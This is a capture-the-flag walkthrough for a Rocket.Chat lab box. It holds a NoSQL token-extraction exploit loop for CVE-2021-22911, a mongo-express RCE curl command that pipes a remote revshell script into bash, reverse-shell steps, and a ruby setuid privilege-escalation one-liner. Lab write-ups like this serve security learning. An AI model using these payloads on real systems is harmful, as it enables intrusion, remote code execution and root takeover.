@@ -1,0 +1,73 @@
+INFORMATION:
+
+port 80 - boltcms
+
+wfuzz -c -z - Wfuzz can be used for finding potential subdomains, -c will print with colour and -z will use a wordlist in the format specified after it
+
+file,/usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt 
+
+--hl 9 - Hides responses with a length of 9
+
+-u rocket.thm - URL
+
+-H "Host: FUZZ.rocket.thm" - Header data 
+
+through searchsploit we can find a nosql to rce exploit, doing a bit of research we can find the CVE and read a bit more into how the exploit works on the github page (https://github.com/CsEnox/CVE-2021-22911)
+
+The part this exploit is currently running through is this:
+
+
+	while len(token)!= 43:
+		for c in characters:
+			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
+			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+			time.sleep(0.5)
+			if 'Meteor.Error' not in r.text:
+				token += c
+				print(f"Got: {token}")
+
+
+To explain what this does, a token is 43 characters long, we can find this through having a look at our stored cookies and begins to grab the token, character by character. It uses "time.sleep" to avoid being detected by the rate limit 
+
+Running the default exploit errors out and gives us a Non-base32 digit, causing the program to error out. How do we fix this, you may ask? Well we have to edit the exploit.
+
+I changed various things in this exploit, mostly to clear it up and make it easier to use. Link to download the exploit in the description
+
+With the new version working, all you have to do is input your VPN's ip, and start a NC listener on port 445 and wait to get RCE!
+
+Interesting.. so we can see there's a MongoDB web interface running on an IP starting with 172. 172 indicates its a local IP and therefore we're going to use chisel to forward data from the web server, to our host machine. We don't have curl or wget on the box so we can use a nice workaround where we convert the contents of the file to base64, transfer it over then decode it on the box. I did it into a folder I can't write to, damnit!
+
+Great! Now we can create a base64 file on the box and transfer it over using SHIFT + INSERT. Once it stops copying over, leave a line break and then close the file using EOF. While that's doing its thing we can set up proxychains, which will help with pivoting through the box.
+
+Upon curling the web interface to see what we get, we can see it's powered by "express". A quick google search brings up express mongodb. And thus... we look for an exploit. It's not likely to be an XSS vuln we're looking for, so let's go with this RCE. Nice, we've got something
+
+proxychains curl 'http://172.17.0.4:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("/curl 10.9.6.23/revshell.sh | bash\")'
+
+Get the hash and crack it... we get a login for what we can assume is the web server we started off with. Bingo! Admin login!
+
+Acceptable file and media types... hmm that sounds like a php reverse shell to me!
+
+Root for this box was extremely challenging and took me quite some time to figure out. My enumeration was quite thorough, however as I found out through nudges I received, not in the right places!
+
+Of my many stabs in the dark, I thought we were in a container so tried container breakout, however we weren't. Thought we could mount drives, which might contain root. Nope. Outdated apps would've came in more use, had I properly read it. More specifically, apparmor. We'll get onto that in a few minutes.
+
+
+Before going any further it's worth noting that you should copy your ssh key to the boxes authorized_keys, you can manually make the .ssh directory in Alvin's home, but make sure you edit the settings of the folder. See stackoverflow link for an explanation (https://stackoverflow.com/questions/6377009/adding-a-public-key-to-ssh-authorized-keys-does-not-log-me-in-automatically)
+
+Files with capabilities? Hmmm that's strange.
+
+/usr/bin/ruby2.5 = cap_setuid+ep   - Set UID capabilities, interesting...                                                                                                                                                                                                                                                                                        
+/usr/bin/mtr-packet = cap_net_raw+ep - Packet listening, also could be interesting
+
+At this point i was really confused, it was right there, clean cut, it HAD to be that, right? Not quite... At this point I got stuck for a while and took a long break I decided to look for files that contained ruby, see if we can't find something interesting. If you're like me and never had a clue what apparmor is, after a bit of research I figured out it's basically something that controls what commands a process/program can run, or cannot run. Including what files can be read, written to and stuff like that. Anyway, let's analyse it
+
+We can only use cat, cp and ls to make and use this exploit. Using the format we made from gtfobins, let's make this work...
+
+/usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+
+First off we start by copying the bash binary and adding the SUID binary to it, then we can execute to another lock, and hopefully, using -p, spawn ourselves into a bash shell as root.
+
+cp /bin/bash /tmp/.X0-lock; chmod +s /tmp/.X0-lock; /usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X0-lock /tmp/.X1-lock"'; ./.X1-lock -p
+
+
+Using this one liner, we get the root user and can then read root.txt and complete the box!
